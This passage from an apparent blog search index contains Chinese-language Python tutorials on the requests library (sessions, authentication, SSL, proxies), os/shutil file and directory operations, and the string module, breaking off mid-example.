python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requests.utils.cookiejar_from_dict(cookie_dict, cookiejar=<span class="keyword">None</span>, overwrite=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>如果需要在会话中保留cookie，需要用到后面要说的Session。<br>Redirection and History</p><h3 id="追踪重定向"><a href="#追踪重定向" class="headerlink" title="追踪重定向"></a>追踪重定向</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = requests.get(<span class="string">'http://github.com'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.url</span><br><span class="line"><span class="string">'https://github.com/'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.status_code</span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r.history</span><br><span class="line">[&lt;Response [<span class="number">301</span>]&gt;]</span><br></pre></td></tr></table></figure><h2 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h2><p>要在会话中保留状态，可以使用request.Session()。<br>Session对象在请求时允许你保留一定的参数和自动设置cookie</p><h3 id="使用get，post等方法"><a href="#使用get，post等方法" class="headerlink" title="使用get，post等方法"></a>使用get，post等方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">s.get(url)   <span class="comment">#cookie保留在s中</span></span><br><span class="line">r = s.get(url) <span class="comment">#再次访问时会保留cookie</span></span><br><span class="line">r = s.post(url) <span class="comment">#再次访问时会保留cookie</span></span><br></pre></td></tr></table></figure><h3 id="自己设置headers，cookies"><a href="#自己设置headers，cookies" class="headerlink" title="自己设置headers，cookies"></a>自己设置headers，cookies</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = requests.Session()</span><br><span class="line">s.auth = (<span class="string">'user'</span>, <span class="string">'pass'</span>)</span><br><span class="line">s.headers.update(&#123;<span class="string">'x-test'</span>: <span class="string">'true'</span>&#125;)</span><br><span class="line">s.get(<span class="string">'http://httpbin.org/headers'</span>, headers=&#123;<span class="string">'x-test2'</span>: <span class="string">'true'</span>&#125;)    <span class="comment">#  'x-test' and 'x-test2' 都会被发送</span></span><br></pre></td></tr></table></figure><h3 id="预设Request"><a href="#预设Request" class="headerlink" title="预设Request"></a>预设Request</h3><p>可以在发送request前做些额外的设定<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"></span><br><span class="line">s = Session()</span><br><span class="line">req = Request(<span class="string">'GET'</span>, url,</span><br><span class="line">  data=data,</span><br><span class="line">  headers=header</span><br><span class="line">)</span><br><span class="line">prepped = req.prepare()</span><br><span class="line"></span><br><span class="line"><span class="comment"># do something with prepped.body</span></span><br><span class="line"><span class="comment"># do something with prepped.headers</span></span><br><span class="line"></span><br><span class="line">resp = s.send(prepped,</span><br><span class="line">  stream=stream,</span><br><span class="line">  verify=verify,</span><br><span class="line">  proxies=proxies,</span><br><span class="line">  cert=cert,</span><br><span class="line">  timeout=timeout</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">print(resp.status_code)</span><br></pre></td></tr></table></figure></p><h2 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h2><h3 id="Basic-Authentication"><a href="#Basic-Authentication" class="headerlink" title="Basic Authentication"></a>Basic Authentication</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://api.github.com/user'</span>, auth=HTTPBasicAuth(<span class="string">'user'</span>, <span class="string">'pass'</span>))</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><p>因为HTTP Basic Auth很常用，所以也可以直接验证<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://api.github.com/user'</span>, auth=(<span class="string">'user'</span>, <span class="string">'pass'</span>))</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure></p><h3 id="Digest-Authentication"><a href="#Digest-Authentication" class="headerlink" title="Digest Authentication"></a>Digest Authentication</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPDigestAuth</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'http://httpbin.org/digest-auth/auth/user/pass'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(url, auth=HTTPDigestAuth(<span class="string">'user'</span>, <span class="string">'pass'</span>))</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><h3 id="OAuth-1-Authentication"><a href="#OAuth-1-Authentication" class="headerlink" title="OAuth 1 Authentication"></a>OAuth 1 Authentication</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> requests_oauthlib <span class="keyword">import</span> OAuth1</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = <span class="string">'https://api.twitter.com/1.1/account/verify_credentials.json'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>auth = OAuth1(<span class="string">'YOUR_APP_KEY'</span>, <span class="string">'YOUR_APP_SECRET'</span>,</span><br><span class="line">                  <span class="string">'USER_OAUTH_TOKEN'</span>, <span class="string">'USER_OAUTH_TOKEN_SECRET'</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(url, auth=auth)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure><h3 id="也可以使用自己写的验证类"><a href="#也可以使用自己写的验证类" class="headerlink" title="也可以使用自己写的验证类"></a>也可以使用自己写的验证类</h3><p>比如某个web服务接受将X-Pizza报头设置成密码的验证，可以这样写验证类<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> AuthBase</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PizzaAuth</span><span class="params">(AuthBase)</span>:</span></span><br><span class="line">  <span class="string">"""Attaches HTTP Pizza Authentication to the given Request object."""</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, username)</span>:</span></span><br><span class="line">    <span class="comment"># setup any auth-related data here</span></span><br><span class="line">    self.username = username</span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">__call__</span><span class="params">(self, r)</span>:</span></span><br><span class="line">    <span class="comment"># modify and return the request</span></span><br><span class="line">    r.headers[<span class="string">'X-Pizza'</span>] = self.username</span><br><span class="line">    <span class="keyword">return</span> r</span><br></pre></td></tr></table></figure></p><p>使用<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'http://pizzabin.org/admin'</span>, auth=PizzaAuth(<span class="string">'kenneth'</span>))</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure></p><h3 id="SSL证书验证"><a href="#SSL证书验证" class="headerlink" title="SSL证书验证"></a>SSL证书验证</h3><p>检查主机的ssl证书<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, verify=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">raise</span> ConnectionError(e)</span><br><span class="line">ConnectionError: HTTPSConnectionPool(host=<span class="string">'kennethreitz.com'</span>, port=<span class="number">443</span>): Max retries exceeded <span class="keyword">with</span> url: / (Caused by &lt;<span class="class"><span class="keyword">class</span> '<span class="title">socket</span>.<span class="title">error</span>'&gt;:</span> [Errno <span class="number">10061</span>] )</span><br></pre></td></tr></table></figure></p><p>github是有的<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://github.com'</span>, verify=<span class="keyword">True</span>)</span><br><span class="line">&lt;Response [<span class="number">200</span>]&gt;</span><br></pre></td></tr></table></figure></p><p>如果你设置验证设置为False，也可以忽略验证SSL证书。</p><p>可以读取验证文件<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">'https://kennethreitz.com'</span>, cert=(<span class="string">'/path/server.crt'</span>, <span class="string">'/path/key'</span>))</span><br></pre></td></tr></table></figure></p><h2 id="代理"><a href="#代理" class="headerlink" title="代理"></a>代理</h2><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">proxies = &#123;</span><br><span class="line">  <span class="string">"http"</span>: <span class="string">"http://127.0.0.1:8080"</span>,</span><br><span class="line">  <span class="string">"https"</span>: <span class="string">"socks5://127.0.0.1:1080"</span></span><br><span class="line">&#125;</span><br><span class="line">requests.get(<span class="string">"http://example.org"</span>, proxies=proxies)</span><br></pre></td></tr></table></figure><p>socket出错</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install pysocks</span><br></pre></td></tr></table></figure><h3 id="设置环境变量"><a href="#设置环境变量" class="headerlink" title="设置环境变量"></a>设置环境变量</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ export HTTP_PROXY=<span class="string">"http://10.10.1.10:3128"</span></span><br><span class="line">$ export HTTPS_PROXY=<span class="string">"http://10.10.1.10:1080"</span></span><br><span class="line">$ python</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>requests.get(<span class="string">"http://example.org"</span>)</span><br></pre></td></tr></table></figure><h3 id="验证-1"><a href="#验证-1" class="headerlink" title="验证"></a>验证</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxies = &#123;</span><br><span class="line">    <span class="string">"http"</span>: <span class="string">"http://user:pass@10.10.1.10:3128/"</span>,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> python </category>
          
          <category> 模块 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
            <tag> requests </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>py文件操作</title>
      <link href="/2016/07/28/python/py%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
      <url>/2016/07/28/python/py%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</url>
      <content type="html"><![CDATA[<p>python 文件操作</p><h3 id="os模块有关文件文件夹"><a href="#os模块有关文件文件夹" class="headerlink" title="os模块有关文件文件夹"></a>os模块有关文件文件夹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">os.getcwd() 得到当前工作目录，即当前Python脚本工作的目录路径:</span><br><span class="line">os.listdir() 返回指定目录下的所有文件和目录名:</span><br><span class="line">os.remove() 函数用来删除一个文件:</span><br><span class="line">os.removedirs(<span class="string">r"c：\python"</span>)删除多个目录：</span><br><span class="line">os.path.isfile() 检验给出的路径是否是一个文件：</span><br><span class="line">os.path.isdir() 检验给出的路径是否是一个目录：</span><br><span class="line">os.path.isabs() 判断是否是绝对路径：</span><br><span class="line">os.path.exists() 检验给出的路径是否真地存:</span><br><span class="line">os.path.split() 返回一个路径的目录名和文件名:</span><br><span class="line">os.path.splitext() 分离扩展名：</span><br><span class="line">os.path.dirname() 获取路径名：</span><br><span class="line">os.path.basename() 获取文件名：</span><br><span class="line">os.system() 运行shell命令:</span><br><span class="line">os.getenv() 与 os.putenv() 读取和设置环境变量:</span><br><span class="line">os.linesep 给出当前平台使用的行终止符:    Windows使用<span class="string">'\r\n'</span>，Linux使用<span class="string">'\n'</span>而Mac使用<span class="string">'\r'</span></span><br><span class="line">os.name 指示你正在使用的平台：       对于Windows，它是<span class="string">'nt'</span>，而对于Linux/Unix用户，它是<span class="string">'posix'</span></span><br><span class="line">os.rename(old, new)重命名：</span><br><span class="line">os.makedirs(<span class="string">r"c：\python\test"</span>)创建多级目录：</span><br><span class="line">os.mkdir(<span class="string">"test"</span>) 创建单个目录：</span><br><span class="line">os.stat(file) 获取文件属性：</span><br><span class="line">os.chmod(file) 修改文件权限与时间戳：</span><br><span class="line">os.exit()终止当前进程：</span><br><span class="line">os.path.getsize(filename) 获取文件大小：</span><br><span class="line">os.mknod(<span class="string">"test.txt"</span>) 创建空文件</span><br><span class="line">os.chdir(<span class="string">"path"</span>)   换路径</span><br><span class="line">os.rmdir(<span class="string">"dir"</span>) 删除目录只能删除空目录</span><br><span class="line">os.remove(<span class="string">"file"</span>) 删除文件</span><br><span class="line">os.rename(<span class="string">"oldname"</span>,<span class="string">"newname"</span>) 重命名文件（目录）</span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">fp = open(<span class="string">"test.txt"</span>,<span class="string">"w"</span>) 直接打开一个文件，如果文件不存在则创建文件</span><br><span class="line">fp.read([size]) <span class="comment">#size为读取的长度，以byte为单位</span></span><br><span class="line">fp.readline([size]) <span class="comment">#读一行，如果定义了size，有可能返回的只是一行的一部分</span></span><br><span class="line">fp.readlines([size]) <span class="comment">#把文件每一行作为一个list的一个成员，并返回这个list。其实它的内部是通过循环</span></span><br><span class="line">调用readline()来实现的。如果提供size参数，size是表示读取内容的总长，也就是说可能只读到文件的一部分。</span><br><span class="line">fp.write(str) <span class="comment">#把str写到文件中，write()并不会在str后加上一个换行符</span></span><br><span class="line">fp.writelines(seq) <span class="comment">#把seq的内容全部写到文件中(多行一次性写入)。这个函数也只是忠实地写</span></span><br><span class="line">入，不会在每行后面加上任何东西。</span><br><span class="line">fp.close() <span class="comment">#关闭文件。python会在一个文件不用后自动关闭文件，不过这一功能没有保证，最好还是养成自己</span></span><br><span class="line">关闭的习惯。  如果一个文件在关闭后还对其进行操作会产生ValueError</span><br><span class="line">fp.flush() <span class="comment">#把缓冲区的内容写入硬盘</span></span><br><span class="line">fp.fileno() <span class="comment">#返回一个长整型的”文件标签“</span></span><br><span class="line">fp.isatty() <span class="comment">#文件是否是一个终端设备文件（unix系统中的）</span></span><br><span class="line">fp.tell() <span class="comment">#返回文件操作标记的当前位置，以文件的开头为原点</span></span><br><span class="line">fp.next() <span class="comment">#返回下一行，并将文件操作标记位移到下一行。把一个</span></span><br><span class="line">file用于<span class="keyword">for</span> … <span class="keyword">in</span> file这样的语句时，就是调用next()函数来实现遍历的。</span><br><span class="line">fp.seek(offset[,whence]) <span class="comment">#将文件打操作标记移到offset的位置。这个offset一般是相对于文件的开头来计算</span></span><br><span class="line">的，一般为正数。但如果提供了whence参数就不一定了，whence可以为<span class="number">0</span>表示从头开始计算，<span class="number">1</span>表示以当前位置为</span><br><span class="line">原点计算。<span class="number">2</span>表示以文件末尾为原点进行计算。需要注意，如果文件以a或a+的模式打开，每次进</span><br><span class="line">行写操作时，文件操作标记会自动返回到文件末尾。</span><br><span class="line">fp.truncate([size]) <span class="comment">#把文件裁成规定的大小，默认的是裁到当前文件操作标记的位置。如果size比文件的大</span></span><br><span class="line">小还要大，依据系统的不同可能是不改变文件，也可能是用<span class="number">0</span>把文件补到相应的大小，也可能是以一些随机的内</span><br><span class="line">容加上去。</span><br></pre></td></tr></table></figure><h3 id="目录操作"><a href="#目录操作" class="headerlink" title="目录操作"></a>目录操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">os.mkdir(<span class="string">"file"</span>) 创建目录</span><br><span class="line">复制文件：</span><br><span class="line">shutil.copyfile(<span class="string">"oldfile"</span>,<span class="string">"newfile"</span>) oldfile和newfile都只能是文件</span><br><span class="line">shutil.copy(<span class="string">"oldfile"</span>,<span class="string">"newfile"</span>) oldfile只能是文件夹，newfile可以是文件，也可以是目标目录</span><br><span class="line">复制文件夹：</span><br><span class="line">shutil.copytree(<span class="string">"olddir"</span>,<span class="string">"newdir"</span>) olddir和newdir都只能是目录，且newdir必须不存在</span><br><span class="line">重命名文件（目录）</span><br><span class="line">os.rename(<span class="string">"oldname"</span>,<span class="string">"newname"</span>) 文件或目录都是使用这条命令</span><br><span class="line">移动文件（目录）</span><br><span class="line">shutil.move(<span class="string">"oldpos"</span>,<span class="string">"newpos"</span>)</span><br><span class="line">删除文件</span><br><span class="line">os.remove(<span class="string">"file"</span>)</span><br><span class="line">删除目录</span><br><span class="line">os.rmdir(<span class="string">"dir"</span>)只能删除空目录</span><br><span class="line">shutil.rmtree(<span class="string">"dir"</span>)    空目录、有内容的目录都可以删</span><br><span class="line">转换目录</span><br><span class="line">os.chdir(<span class="string">"path"</span>)   换路径</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> python </category>
          
          <category> 模块 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 模块 </tag>
            
            <tag> py文件操作 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>string</title>
      <link href="/2016/07/28/python/string/"/>
      <url>/2016/07/28/python/string/</url>
      <content type="html"><![CDATA[<p>原文：<a href="http://www.cnblogs.com/rollenholt/archive/2011/11/25/2263722.html" target="_blank" rel="noopener">http://www.cnblogs.com/rollenholt/archive/2011/11/25/2263722.html</a></p><h2 id="字符"><a href="#字符" class="headerlink" title="字符"></a>字符</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_letters</span><br><span class="line"></span><br><span class="line"><span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_lowercase</span><br><span class="line"></span><br><span class="line"><span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.ascii_uppercase</span><br><span class="line"></span><br><span class="line"><span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.digits</span><br><span class="line"></span><br><span class="line"><span class="string">'0123456789'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.hexdigits</span><br><span class="line"></span><br><span class="line"><span class="string">'0123456789abcdefABCDEF'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.letters</span><br><span class="line"></span><br><span class="line"><span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.lowercase</span><br><span class="line"></span><br><span class="line"><span class="string">'abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.uppercase</span><br><span class="line"></span><br><span class="line"><span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.octdigits</span><br><span class="line"></span><br><span class="line"><span class="string">'01234567'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.punctuation</span><br><span class="line"></span><br><span class="line"><span class="string">'!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.printable</span><br><span class="line"></span><br><span class="line"><span class="string">'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&amp;\'()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~ \t\n\r\x0b\x0c'</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>string.whitespace</span><br><span class="line"></span><br><span class="line"><span class="string">'\t\n\x0b\x0c\r</span></span><br></pre></td></tr></table></figure><h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;0&#125;, &#123;1&#125;, &#123;2&#125;'</span>.format(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line"><span class="string">'a, b, c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;&#125;, &#123;&#125;, &#123;&#125;'</span>.format(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)  <span class="comment"># 2.7+ only</span></span><br><span class="line"><span class="string">'a, b, c'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;2&#125;, &#123;1&#125;, &#123;0&#125;'</span>.format(<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>)</span><br><span class="line"><span class="string">'c, b, a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;2&#125;, &#123;1&#125;, &#123;0&#125;'</span>.format(*<span class="string">'abc'</span>)      <span class="comment"># unpacking argument sequence</span></span><br><span class="line"><span class="string">'c, b, a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">'&#123;0&#125;&#123;1&#125;&#123;0&#125;'</span>.format(<span class="string">'abra'</span>, <span class="string">'cad'</span>)   <span class="comment"># arguments' indices can be repeated</span></span><br><span class="line"><span 